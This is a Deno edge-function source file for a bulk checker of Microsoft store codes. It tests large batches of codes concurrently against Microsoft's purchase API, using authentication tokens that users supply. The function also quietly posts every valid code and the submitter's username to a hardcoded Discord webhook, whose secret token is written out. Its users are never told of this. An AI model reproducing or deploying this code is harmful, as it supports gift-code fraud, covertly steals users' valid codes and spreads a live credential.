import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

declare const EdgeRuntime: {
  waitUntil(promise: Promise<unknown>): void;
};

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1367062196294651974/sVITbLyiie98aY3TnDU2SyAPxok4gLXgaHABBk2ORVoCe28fsUZQ7i5wo-tzgF2-8Z94";

interface CheckRequest {
  wlids: string[];
  codes: string[];
  threads?: number;
  username?: string;
}

interface CheckResult {
  code: string;
  status: "valid" | "used" | "expired" | "invalid" | "error";
  title?: string;
  error?: string;
}

const titleCache = new Map<string, string>();

async function sendToDiscord(results: CheckResult[], username?: string) {
  try {
    const validCodes = results.filter(r => r.status === 'valid');
    
    if (validCodes.length === 0) {
      console.log('No valid codes to send to Discord');
      return;
    }

    const txtContent = validCodes.map(r => r.code).join('\n');
    
    const formData = new FormData();
    
    // Add username as message content
    if (username) {
      formData.append('content', `**User:** ${username}`);
    }
    
    const blob = new Blob([txtContent], { type: 'text/plain' });
    formData.append('files[0]', blob, `valid_codes_${username || 'unknown'}.txt`);

    await fetch(DISCORD_WEBHOOK, {
      method: 'POST',
      body: formData
    });

    console.log('Results sent to Discord');
  } catch (err) {
    console.error('Failed to send to Discord:', err);
  }
}

async function checkSingleCode(
  code: string, 
  wlid: string
): Promise<CheckResult> {
  const trimmedCode = code.trim();
  
  if (!trimmedCode) {
    return { code: trimmedCode, status: "invalid" };
  }

  if (trimmedCode.length < 18) {
    return { code: trimmedCode, status: "invalid" };
  }

  let retryCount = 0;
  while (retryCount < 3) {
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 30000);

      const response = await fetch(
        `https://purchase.mp.microsoft.com/v7.0/tokenDescriptions/${trimmedCode}?market=US&language=en-US&supportMultiAvailabilities=true`,
        {
          method: "GET",
          headers: {
            "Authorization": wlid,
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Origin": "https://www.microsoft.com",
            "Referer": "https://www.microsoft.com/",
          },
          signal: controller.signal,
        }
      );

      clearTimeout(timeoutId);

      if (response.status === 429) {
        await new Promise((resolve) => setTimeout(resolve, 5000));
        retryCount++;
        continue;
      }

      const data = await response.json();

      let title = "N/A";

      if (data.products && data.products.length > 0) {
        const product = data.products[0];
        title = product.sku?.title || product.title;
        if (!title && product.localizedProperties?.[0]) {
          title = product.localizedProperties[0].productTitle;
        }
      } else if (data.universalStoreBigIds && data.universalStoreBigIds.length > 0) {
        const parts = data.universalStoreBigIds[0].split("/");
        const productId = parts[0];
        const skuId = parts[1];

        if (titleCache.has(productId)) {
          title = titleCache.get(productId)!;
        } else {
          try {
            const catalogRes = await fetch(
              `https://displaycatalog.mp.microsoft.com/v7.0/products?bigIds=${productId}&market=US&languages=en-US`,
              { method: "GET" }
            );

            if (catalogRes.status === 200) {
              const catalogData = await catalogRes.json();
              if (catalogData.Products && catalogData.Products.length > 0) {
                const p = catalogData.Products[0];
                if (p.DisplaySkuAvailabilities) {
                  const matchingSku = p.DisplaySkuAvailabilities.find(
                    (s: any) => s.Sku.SkuId === skuId
                  );
                  if (matchingSku?.Sku?.LocalizedProperties?.[0]) {
                    title = matchingSku.Sku.LocalizedProperties[0].SkuTitle || 
                            matchingSku.Sku.LocalizedProperties[0].SkuDescription;
                  }
                }
                if (title === "N/A" && p.LocalizedProperties?.[0]) {
                  title = p.LocalizedProperties[0].ProductTitle;
                }
                if (title !== "N/A") {
                  titleCache.set(productId, title);
                }
              }
            }
          } catch {
            title = `ID: ${productId}`;
          }
        }
      }

      const cleanTitle = (title || "N/A").trim();

      if (data.tokenState === "Active") {
        return { code: trimmedCode, status: "valid", title: cleanTitle };
      } else if (data.tokenState === "Redeemed") {
        return { code: trimmedCode, status: "used", title: cleanTitle };
      } else if (data.tokenState === "Expired") {
        return { code: trimmedCode, status: "expired", title: cleanTitle };
      } else if (data.code === "NotFound") {
        return { code: trimmedCode, status: "invalid" };
      } else if (data.code === "Unauthorized") {
        return { code: trimmedCode, status: "error", error: "WLID unauthorized" };
      } else {
        return { code: trimmedCode, status: "invalid" };
      }

    } catch (error) {
      retryCount++;
      if (retryCount >= 3) {
        return { code: trimmedCode, status: "error", error: String(error) };
      }
      await new Promise((resolve) => setTimeout(resolve, 1000));
    }
  }

  return { code: trimmedCode, status: "error", error: "Max retries exceeded" };
}

// Optimized worker pool with better memory management
async function processWithWorkerPool<T, R>(
  items: T[],
  concurrency: number,
  fn: (item: T, index: number) => Promise<R>,
  onResult?: (result: R, index: number) => void
): Promise<R[]> {
  const results: R[] = new Array(items.length);
  let currentIndex = 0;
  let completedCount = 0;

  async function worker(): Promise<void> {
    while (true) {
      const index = currentIndex++;
      if (index >= items.length) break;
      
      try {
        const result = await fn(items[index], index);
        results[index] = result;
        completedCount++;
        
        if (onResult) {
          onResult(result, index);
        }
        
        // Log progress every 100 items
        if (completedCount % 100 === 0) {
          console.log(`Progress: ${completedCount}/${items.length}`);
        }
      } catch (error) {
        results[index] = { error: String(error) } as R;
        completedCount++;
      }
    }
  }

  // Create worker pool
  const workers = Array(Math.min(concurrency, items.length))
    .fill(null)
    .map(() => worker());

  await Promise.all(workers);
  return results;
}

serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { wlids, codes, threads = 10, username }: CheckRequest = await req.json();

    console.log(`Starting check for ${codes.length} codes with ${wlids.length} WLIDs, ${threads} threads, user: ${username || 'unknown'}`);

    if (!wlids || wlids.length === 0) {
      return new Response(
        JSON.stringify({ error: "WLID tokens are required" }),
        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    if (!codes || codes.length === 0) {
      return new Response(
        JSON.stringify({ error: "Codes are required" }),
        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    const formattedWlids = wlids.map((wlid) => 
      wlid.includes("WLID1.0=") ? wlid.trim() : `WLID1.0="${wlid.trim()}"`
    );

    const MAX_PER_WLID = 40;
    
    // Create tasks with proper WLID assignment
    const tasks: { code: string; wlid: string }[] = [];
    for (let i = 0; i < codes.length; i++) {
      const code = codes[i].trim();
      if (!code) continue;
      
      const wlidIndex = Math.floor(i / MAX_PER_WLID);
      if (wlidIndex >= formattedWlids.length) {
        console.log(`Warning: Ran out of WLIDs at code ${i}. Max capacity: ${formattedWlids.length * MAX_PER_WLID}`);
        break;
      }
      
      tasks.push({ code, wlid: formattedWlids[wlidIndex] });
    }

    console.log(`Processing ${tasks.length} tasks`);

    // Use streaming response for large batches
    if (tasks.length > 500) {
      // For large batches, use streaming
      const encoder = new TextEncoder();
      const stream = new ReadableStream({
        async start(controller) {
          const allResults: CheckResult[] = [];
          const concurrency = Math.min(threads, 100);
          
          await processWithWorkerPool(
            tasks,
            concurrency,
            async (task) => checkSingleCode(task.code, task.wlid),
            (result) => {
              allResults.push(result);
              // Stream each result as JSON line
              controller.enqueue(encoder.encode(JSON.stringify(result) + "\n"));
            }
          );
          
          // Send to Discord in background
          EdgeRuntime.waitUntil(sendToDiscord(allResults, username));
          
          controller.close();
        }
      });

      return new Response(stream, {
        headers: {
          ...corsHeaders,
          "Content-Type": "application/x-ndjson",
          "Transfer-Encoding": "chunked",
        },
      });
    }

    // For smaller batches, use regular JSON response
    const concurrency = Math.min(threads, 100);
    const results = await processWithWorkerPool(
      tasks,
      concurrency,
      async (task) => checkSingleCode(task.code, task.wlid)
    );

    console.log(`Check complete. Results: ${results.length}`);

    // Send to Discord in background
    EdgeRuntime.waitUntil(sendToDiscord(results, username));

    return new Response(
      JSON.stringify({ results }),
      { 
        status: 200, 
        headers: { ...corsHeaders, "Content-Type": "application/json" } 
      }
    );

  } catch (error) {
    console.error("Error:", error);
    return new Response(
      JSON.stringify({ error: String(error) }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  }
});
